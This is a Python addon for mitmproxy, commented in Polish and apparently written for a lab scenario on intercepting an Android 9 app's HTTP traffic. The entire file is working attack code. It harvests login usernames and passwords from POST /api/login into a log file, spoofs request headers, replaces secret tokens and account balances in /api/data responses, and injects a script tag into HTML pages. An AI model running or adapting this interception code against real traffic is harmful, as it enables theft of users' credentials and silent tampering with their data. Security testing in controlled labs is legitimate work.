"""
Scenariusz 2: Traffic Tampering - modyfikacja danych w locie
============================================================
Cel: przechwytywanie i modyfikacja żądań oraz odpowiedzi HTTP/HTTPS
    - kradzież danych logowania (credential harvesting)
    - modyfikacja odpowiedzi serwera
    - wstrzykiwanie dodatkowych danych

Uruchomienie:
    docker exec wzirni-mitm mitmweb --listen-port 8080 -s /scripts/traffic_tamper.py
"""

import json
from datetime import datetime
from mitmproxy import http, ctx

LOG_FILE = "/tmp/mitm_traffic.log"


def _log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    ctx.log.warn(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


class TrafficTamperAddon:

    # ------------------------------------------------------------------
    # Modyfikacja ŻĄDAŃ (Client → Server)
    # ------------------------------------------------------------------
    def request(self, flow: http.HTTPFlow) -> None:
        url    = flow.request.pretty_url
        method = flow.request.method

        # Wykrycie klienta Android 9 (API 28)
        ua = flow.request.headers.get("User-Agent", "")
        if "Android 9" in ua or "Android/9" in ua:
            _log(f"[ANDROID-9.0] Wykryto klienta Android 9 (API 28) | {method} {url}")

        # Przechwytywanie danych logowania
        if "/api/login" in url and method == "POST":
            try:
                body = json.loads(flow.request.content.decode("utf-8"))
                username = body.get("username", "")
                password = body.get("password", "")
                _log(f"[CREDENTIAL-HARVEST] POST /api/login | user={username} | pass={password}")

                # Zapisz do osobnego pliku
                with open("/tmp/captured_credentials.log", "a") as f:
                    f.write(f"{datetime.now().isoformat()} | {username}:{password}\n")
            except Exception as e:
                ctx.log.error(f"[TAMPER-REQ] Błąd parsowania: {e}")

        # Modyfikacja nagłówków żądania (lowercase — wymagane przez HTTP/2)
        flow.request.headers["x-forwarded-for"] = "1.2.3.4"
        flow.request.headers["x-tampered"] = "true"

        _log(f"[REQUEST] {method} {url}")

    # ------------------------------------------------------------------
    # Modyfikacja ODPOWIEDZI (Server → Client)
    # ------------------------------------------------------------------
    def response(self, flow: http.HTTPFlow) -> None:
        url         = flow.request.pretty_url
        status_code = flow.response.status_code
        content_type = flow.response.headers.get("content-type", "")

        _log(f"[RESPONSE] {flow.request.method} {url} -> HTTP {status_code}")

        # Modyfikacja odpowiedzi /api/data - podmiana tokenu
        if "/api/data" in url and "json" in content_type:
            try:
                data = json.loads(flow.response.content.decode("utf-8"))
                original_token = data.get("secret_token", "")
                original_balance = data.get("balance", 0)

                # Podmień wrażliwe dane
                data["secret_token"]  = "TAMPERED_TOKEN_BY_MITM"
                data["balance"]       = 0.01        # zmodyfikowane saldo
                data["_mitm_note"]    = "This response was tampered by MITM"
                data["_original_token"] = original_token  # dla analizy

                flow.response.content = json.dumps(data).encode("utf-8")
                _log(
                    f"[TAMPER-RESP] /api/data | "
                    f"token: {original_token[:8]}... -> TAMPERED | "
                    f"balance: {original_balance} -> 0.01"
                )
            except Exception as e:
                ctx.log.error(f"[TAMPER-RESP] Błąd: {e}")

        # Wstrzykiwanie JavaScript (przykład dla odpowiedzi HTML)
        if "text/html" in content_type:
            try:
                body = flow.response.content.decode("utf-8")
                inject = '<script>console.log("MITM injected script");</script>'
                if "</body>" in body:
                    body = body.replace("</body>", f"{inject}</body>")
                    flow.response.content = body.encode("utf-8")
                    _log(f"[JS-INJECT] Wstrzyknięto skrypt do {url}")
            except Exception:
                pass

        # Oznaczenie odpowiedzi (lowercase — wymagane przez HTTP/2)
        flow.response.headers["x-mitm-intercepted"] = "true"


addons = [TrafficTamperAddon()]
